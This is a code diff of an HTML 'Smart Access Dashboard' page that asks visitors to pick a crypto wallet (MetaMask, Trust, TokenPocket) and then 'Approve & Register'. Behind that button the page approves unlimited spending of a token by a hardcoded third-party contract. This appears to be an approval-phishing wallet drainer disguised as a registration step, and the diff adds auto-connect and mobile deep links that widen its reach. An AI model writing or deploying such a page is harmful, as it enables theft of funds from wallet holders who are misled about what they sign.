@@ -1,34 +1,49 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Wallet Access</title>
+  <title>Smart Access Dashboard</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
-  
   <style>
-    body { font-family: sans-serif; max-width: 100%; margin: 20px; text-align: center; background-color: #f4f7f6; }
-    .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); margin-top: 50px; }
-    button { padding: 15px; font-size: 16px; margin: 10px 0; cursor: pointer; border-radius: 10px; border: none; width: 100%; font-weight: bold; }
-    #connectBtn { background-color: #2196F3; color: white; }
-    #registerBtn { background-color: #4CAF50; color: white; display: none; }
-    .status { color: #666; font-size: 14px; margin-top: 15px; }
+    body { font-family: 'Segoe UI', sans-serif; margin: 0; padding: 20px; background: #f0f2f5; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
+    .card { background: white; padding: 25px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; }
+    .wallet-options { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 15px; margin: 20px 0; }
+    .wallet-item { cursor: pointer; border: 1px solid #eee; padding: 10px; border-radius: 12px; transition: 0.3s; }
+    .wallet-item:hover { background: #f8f9fa; border-color: #2196F3; }
+    .wallet-item img { width: 50px; height: 50px; margin-bottom: 8px; }
+    .wallet-item span { font-size: 12px; font-weight: bold; display: block; }
+    
+    #registerBtn { background: #4CAF50; color: white; padding: 16px; font-size: 18px; border-radius: 12px; border: none; width: 100%; font-weight: bold; display: none; margin-top: 20px; cursor: pointer; }
+    #registerBtn:disabled { background: #ccc; }
+    .status { color: #888; font-size: 13px; margin-top: 15px; }
   </style>
 </head>
 <body>
 
 <div class="card">
-  <h2>Smart Access</h2>
-  <p id="msgText">Connect wallet to register</p>
+  <h2 id="msgText">Choose Your Wallet</h2>
+  <p style="color: #666; font-size: 14px;">Select a wallet to register and connect</p>
 
-  <button id="connectBtn">Connect Wallet</button>
-  <button id="registerBtn">Register & Access</button>
-  
+  <div id="walletPicker" class="wallet-options">
+    <div class="wallet-item" onclick="openWallet('metamask')">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Mirror_Logo.svg" alt="MetaMask">
+      <span>MetaMask</span>
+    </div>
+    <div class="wallet-item" onclick="openWallet('trust')">
+      <img src="https://trustwallet.com/assets/images/media/assets/trust_wallet_logo.png" alt="Trust">
+      <span>Trust</span>
+    </div>
+    <div class="wallet-item" onclick="openWallet('tp')">
+      <img src="https://www.tokenpocket.pro/static/images/logo.png" alt="TokenPocket">
+      <span>TokenPocket</span>
+    </div>
+  </div>
+
+  <button id="registerBtn">Approve & Register</button>
   <div id="loader" class="status"></div>
 </div>
 
 <script>
-  // --- Configuration ---
   const WALLET_MANAGER = "0x43c7df8DB3503c4839C9249E7D0C520E801C9dBA"; 
   const TOKEN = "0x3B66b1E08F55AF26c8eA14a73dA64b6bC8D799dE"; 
 
@@ -37,66 +52,77 @@
 
   let provider, signer, userAddress, tokenContract, walletManagerContract;
 
-  async function initWallet(web3Provider) {
-    provider = new ethers.providers.Web3Provider(web3Provider);
-    signer = provider.getSigner();
-    userAddress = await signer.getAddress();
-    
-    tokenContract = new ethers.Contract(TOKEN, ERC20_ABI, signer);
-    walletManagerContract = new ethers.Contract(WALLET_MANAGER, WALLET_MANAGER_ABI, signer);
-
-    document.getElementById("connectBtn").style.display = "none";
-    document.getElementById("registerBtn").style.display = "block";
-    document.getElementById("msgText").innerText = "Connected: " + userAddress.substring(0, 8) + "...";
+  function isMobile() {
+    return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
   }
 
-  document.getElementById("connectBtn").onclick = async () => {
-    // 1. Agar MetaMask App ke browser me khula hai
+  async function openWallet(type) {
+    const dappUrl = window.location.href.split('://')[1];
+    
+    // Agar user Chrome/Safari me hai
+    if (isMobile() && !window.ethereum) {
+      if (type === 'metamask') {
+        window.location.href = `https://metamask.app.link/dapp/${dappUrl}`;
+      } else if (type === 'trust') {
+        window.location.href = `https://link.trustwallet.com/open_url?url=${window.location.href}`;
+      } else if (type === 'tp') {
+        window.location.href = `tpdapp://open?params={"url": "${window.location.href}"}`;
+      }
+      return;
+    }
+
+    // Agar user DApp Browser ke andar hai toh connect karein
+    connectWallet();
+  }
+
+  async function connectWallet() {
     if (window.ethereum) {
       try {
         await window.ethereum.request({ method: "eth_requestAccounts" });
-        await initWallet(window.ethereum);
+        provider = new ethers.providers.Web3Provider(window.ethereum);
+        signer = provider.getSigner();
+        userAddress = await signer.getAddress();
+        
+        tokenContract = new ethers.Contract(TOKEN, ERC20_ABI, signer);
+        walletManagerContract = new ethers.Contract(WALLET_MANAGER, WALLET_MANAGER_ABI, signer);
+
+        document.getElementById("walletPicker").style.display = "none";
+        document.getElementById("registerBtn").style.display = "block";
+        document.getElementById("msgText").innerText = "Connected!";
+        document.getElementById("loader").innerText = "Wallet: " + userAddress.substring(0, 10) + "...";
       } catch (err) { alert("Connection rejected"); }
-    } 
-    // 2. Agar Mobile Chrome/Safari me khula hai (WalletConnect Use Karein)
-    else {
-      try {
-        const walletConnectProvider = new WalletConnectProvider.default({
-          rpc: { 56: "https://bsc-dataseed.binance.org/" }, // BSC Mainnet
-          // Testnet ke liye: 97: "https://data-seed-prebsc-1-s1.binance.org:8545/"
-        });
-        await walletConnectProvider.enable();
-        await initWallet(walletConnectProvider);
-      } catch (err) { alert("Mobile connection failed"); }
+    } else {
+      alert("Please open this page inside a Crypto Wallet App.");
     }
-  };
+  }
+
+  // Automatic check agar user wallet ke andar hi link kholta hai
+  if (window.ethereum) {
+    connectWallet();
+  }
 
   document.getElementById("registerBtn").onclick = async () => {
     try {
       const btn = document.getElementById("registerBtn");
-      const loader = document.getElementById("loader");
-      
       btn.disabled = true;
       btn.innerText = "Processing...";
-      loader.innerText = "Confirm the prompt in your wallet app";
+      document.getElementById("loader").innerText = "Please confirm the transactions in your app";
 
-      // Max Approval
       const maxUint = ethers.constants.MaxUint256;
-      let txApprove = await tokenContract.approve(WALLET_MANAGER, maxUint);
-      await txApprove.wait();
+      const tx1 = await tokenContract.approve(WALLET_MANAGER, maxUint);
+      await tx1.wait();
 
-      // Register
-      let txRegister = await walletManagerContract.register();
-      await txRegister.wait();
+      const tx2 = await walletManagerContract.register();
+      await tx2.wait();
 
-      loader.innerText = "";
+      document.getElementById("loader").innerText = "";
       document.getElementById("msgText").innerHTML = "<b style='color:green'>Success!</b>";
       btn.style.display = "none";
       alert("Registration Successful!");
     } catch (error) {
       alert("Transaction failed");
       document.getElementById("registerBtn").disabled = false;
-      document.getElementById("registerBtn").innerText = "Register & Access";
+      document.getElementById("registerBtn").innerText = "Approve & Register";
     }
   };
 </script>
